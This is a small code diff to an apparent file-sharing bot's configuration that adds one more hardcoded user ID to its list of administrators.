@@ -66,6 +66,7 @@ USER_REPLY_TEXT = "YOU... NOT... ADMIN!!!"
 
 ADMINS.append(OWNER_ID)
 ADMINS.append(6820461647)
+ADMINS.append(1726298674)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
